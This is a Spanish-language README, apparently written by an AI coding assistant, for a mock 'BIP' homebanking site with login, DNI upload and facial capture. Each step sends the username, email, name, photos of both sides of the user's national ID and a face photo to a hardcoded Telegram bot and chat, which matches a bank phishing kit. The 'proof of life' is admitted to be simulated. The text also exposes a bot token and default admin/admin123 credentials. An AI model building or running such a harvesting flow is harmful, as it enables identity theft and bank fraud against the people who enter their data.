# 🏦 BIP - Sistema de Homebanking con Verificación Biométrica

## 🎉 ¡El Sistema Está Corriendo!

### 📍 URLs Activas:

- **Frontend:** http://localhost:5173
- **Backend:** http://localhost:3000

---

## 🔐 Credenciales de Prueba

Para probar el sistema completo, usa estas credenciales:

**Usuario:** `admin`  
**Contraseña:** `admin123`

---

## 🚀 Flujo Completo del Sistema

### 1️⃣ **Pantalla de Login**
- Ingresa usuario y contraseña
- ✅ El backend enviará una notificación a tu Telegram con:
  - Usuario que inició sesión
  - Email
  - Nombre
  - Fecha y hora

### 2️⃣ **Verificación de DNI** 
- Carga foto del frente del DNI
- Carga foto del dorso del DNI
- ✅ Recibirás en Telegram:
  - Mensaje con datos del usuario
  - Foto del frente del DNI
  - Foto del dorso del DNI

### 3️⃣ **Verificación Biométrica Facial**

**Pantalla de Instrucciones:**
- Requisitos correctos vs no permitidos
- Información legal
- Click en "Iniciar Verificación Biométrica"

**Pantalla de Captura:**
- 3 indicadores en tiempo real:
  - 🎯 Detección de rostro
  - 💡 Nivel de iluminación (40-80% óptimo)
  - 🔍 Nitidez de imagen
- Posiciona tu rostro en el óvalo verde
- Cuando todos los indicadores estén en verde ✓
- Click en "Capturar Imagen Biométrica"
- Contador 3-2-1 y captura automática

**Pantalla de Análisis:**
- Validación de calidad
- Verificación de prueba de vida
- Comparación con documento

**Pantalla de Confirmación:**
- Visualiza la imagen capturada
- Métricas finales de calidad
- Click en "Confirmar y Completar Verificación"
- ✅ Recibirás en Telegram:
  - Foto facial biométrica
  - Métricas de calidad (iluminación, nitidez)
  - Nivel de luz detectado

### 4️⃣ **Dashboard**
- Acceso completo a la cuenta bancaria

---

## 📱 Notificaciones de Telegram Configuradas

Tu bot de Telegram está enviando notificaciones a:
- **Token:** 7964363913:AAEfVemjF9dX-WJ6JXRVTyT5PqhBJRACYMI
- **Chat ID:** 6968749488

### Revisa tu Telegram para ver:
- ✅ Notificaciones de login
- 📄 Fotos del DNI (frente y dorso)
- 😊 Foto de verificación facial con métricas

---

## 🛠️ Controles del Sistema

### Para Detener los Servidores:
```bash
# Backend: Presiona Ctrl+C en la terminal del backend
# Frontend: Presiona Ctrl+C en la terminal del frontend
```

### Para Reiniciar:
```bash
# Backend
cd homebanking-backend
npm run dev

# Frontend  
cd homebanking-frontend
npm run dev
```

---

## ✨ Características Profesionales Implementadas

### 🔐 Seguridad:
- Autenticación JWT
- Rate limiting (protección contra fuerza bruta)
- Helmet (headers de seguridad)
- CORS configurado
- Encriptación de contraseñas con bcrypt

### 📸 Verificación Biométrica:
- Detección de rostro en tiempo real
- Análisis de nitidez (algoritmo Laplaciano)
- Detección de reflejos (glare detection)
- Validación de iluminación óptima
- Control de calidad multi-criterio
- Límite de 5 intentos
- Prueba de vida simulada

### 🎨 Diseño:
- Interfaz profesional nivel Banco Central
- Responsive design
- Gradientes institucionales
- Animaciones suaves
- Feedback visual en tiempo real

### 📱 Integración Telegram:
- Notificaciones automáticas
- Envío de imágenes en alta calidad
- Formato profesional de mensajes
- Timestamps en formato ISO

---

## 🎯 Próximos Pasos Opcionales

Si deseas mejorar aún más el sistema:

1. **Base de datos real** (MongoDB, PostgreSQL)
2. **Reconocimiento facial real** (face-api.js, AWS Rekognition)
3. **Almacenamiento en la nube** (AWS S3, Azure Blob)
4. **Autenticación de dos factores** (2FA)
5. **Logs de auditoría**
6. **Dashboard de administración**

---

## 📞 Soporte

Si tienes algún problema:
1. Verifica que ambos servidores estén corriendo
2. Revisa las consolas para ver errores
3. Asegúrate de que el puerto 5173 y 3000 estén libres
4. Verifica la configuración de Telegram en el .env

---

## 🎉 ¡Disfruta Probando el Sistema!

Tu aplicación de homebanking con verificación biométrica profesional está lista.
